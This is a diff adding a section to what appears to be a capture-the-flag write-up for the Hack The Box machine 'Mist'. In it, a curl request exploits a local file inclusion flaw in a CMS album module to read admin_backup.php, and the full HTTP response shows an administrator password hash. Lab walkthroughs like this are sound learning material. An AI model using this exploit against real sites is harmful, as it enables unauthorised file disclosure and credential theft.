@@ -71,3 +71,36 @@ Also an attempt to test RFI gave this message
 Returning to the POC i find this, admin_backup.php sounds interesting
 
 # LFI to access administrator hash
+
+```python
+curl "http://mist.htb/data/modules/albums/albums_getimage.php?image=admin_backup.php" --verbose 
+* Host mist.htb:80 was resolved.
+* IPv6: (none)
+* IPv4: 10.129.231.20
+*   Trying 10.129.231.20:80...
+* Established connection to mist.htb (10.129.231.20 port 80) from 10.10.15.69 port 34710 
+* using HTTP/1.x
+> GET /data/modules/albums/albums_getimage.php?image=admin_backup.php HTTP/1.1
+> Host: mist.htb
+> User-Agent: curl/8.19.0
+> Accept: */*
+> 
+* Request completely sent off
+< HTTP/1.1 200 OK
+< Date: Thu, 18 Jun 2026 18:00:32 GMT
+< Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1
+< X-Powered-By: PHP/8.1.1
+< Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+< Expires: Thu, 19 Nov 1981 08:52:00 GMT
+< Pragma: no-cache
+< Content-Length: 149
+< Content-Type: image/jpeg
+< 
+<?php
+$ww = 'c81dde783f9543114ecd9fa14e8440a2a868bfe0bacdf14d29fce0605c09d5a2bcd2028d0d7a3fa805573d074faa15d6361f44aec9a6efe18b754b3c265ce81e';
+* Connection #0 to host mist.htb:80 left intact
+?>146
+```
+
+This looks to be a hash
+
